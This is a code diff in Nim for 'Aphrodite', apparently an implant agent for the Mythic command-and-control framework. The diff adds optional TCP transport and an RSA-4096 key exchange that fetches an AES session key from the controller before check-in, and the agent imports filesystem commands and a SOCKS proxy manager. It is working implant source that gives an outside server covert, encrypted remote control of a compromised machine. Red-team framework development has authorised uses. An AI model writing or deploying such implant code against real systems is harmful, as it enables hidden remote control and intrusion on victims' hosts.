@@ -1,6 +1,14 @@
 import std/[json, os, strutils, times, random, base64]
-import config, crypto/aes, transport/http, core/utils, core/types
+import config, crypto/aes, core/utils, core/types
 import core/jobs, proxy/socks_mgr
+
+when defined(c2ProfileTcp):
+  import transport/tcp
+else:
+  import transport/http
+
+when defined(useEke):
+  import crypto/eke
 import commands/registry
 import commands/filesystem/cat, commands/filesystem/cd, commands/filesystem/cp
 import commands/filesystem/drives, commands/filesystem/ls, commands/filesystem/mkdir
@@ -135,12 +143,80 @@ proc setupPsk(ag: AphroditeAgent): bool =
   return true
 
 # ---------------------------------------------------------------------------
+# EKE staging (only compiled with -d:useEke)
+# ---------------------------------------------------------------------------
+
+when defined(useEke):
+  proc stagingRsa(ag: AphroditeAgent): bool =
+    ## RSA-4096 key exchange with Mythic (staging_rsa action).
+    ## 1. Generate RSA key pair
+    ## 2. Send public key plaintext → Mythic encrypts AES session key with it
+    ## 3. Decrypt AES session key → use for all subsequent comms
+    var ctx = ekaGenerate()
+    if not ctx.ekaIsValid():
+      stderr.writeLine("[!] EKE: RSA key generation failed")
+      return false
+
+    let sessionId = ekaSessionId()
+    let pubB64    = ctx.ekaPublicKeyB64()
+
+    let jsonBody = """{"action":"staging_rsa","pub_key":"""" & pubB64 &
+                   """","session_id":"""" & sessionId & """"}"""
+
+    stderr.writeLine("[*] EKE: sending staging_rsa (RSA-4096)")
+
+    ## Send WITHOUT encryption — use payloadUUID and empty aesKey
+    let raw = ag.transport.post(ag.payloadUUID, @[], jsonBody)
+    if raw.len == 0:
+      ctx.ekaFree()
+      stderr.writeLine("[!] EKE: no response from server")
+      return false
+
+    var resp: JsonNode
+    try:
+      resp = parseJson(raw)
+    except:
+      ctx.ekaFree()
+      stderr.writeLine("[!] EKE: invalid JSON response")
+      return false
+
+    let newUUID = resp{"uuid"}.getStr("")
+    let encKey  = resp{"session_key"}.getStr("")
+    let respSid = resp{"session_id"}.getStr("")
+
+    if newUUID.len == 0 or encKey.len == 0:
+      ctx.ekaFree()
+      stderr.writeLine("[!] EKE: missing uuid or session_key in response")
+      return false
+    if respSid != sessionId:
+      ctx.ekaFree()
+      stderr.writeLine("[!] EKE: session_id mismatch")
+      return false
+
+    ## Decrypt AES session key with our RSA private key (PKCS#1 v1.5)
+    let aesKey = ctx.ekaDecryptSessionKey(encKey)
+    ctx.ekaFree()
+
+    if aesKey.len != 32:
+      stderr.writeLine("[!] EKE: decrypted key length wrong (" & $aesKey.len & " bytes, expected 32)")
+      return false
+
+    ag.mythicID = newUUID
+    ag.aesKey   = aesKey
+    stderr.writeLine("[+] EKE staging complete — staging UUID=" & newUUID)
+    return true
+
+# ---------------------------------------------------------------------------
 # Checkin
 # ---------------------------------------------------------------------------
 
 proc checkin(ag: AphroditeAgent): bool =
-  if not ag.setupPsk():
-    return false
+  when defined(useEke):
+    if not ag.stagingRsa():
+      return false
+  else:
+    if not ag.setupPsk():
+      return false
 
   let msg = %*{
     "action":          "checkin",
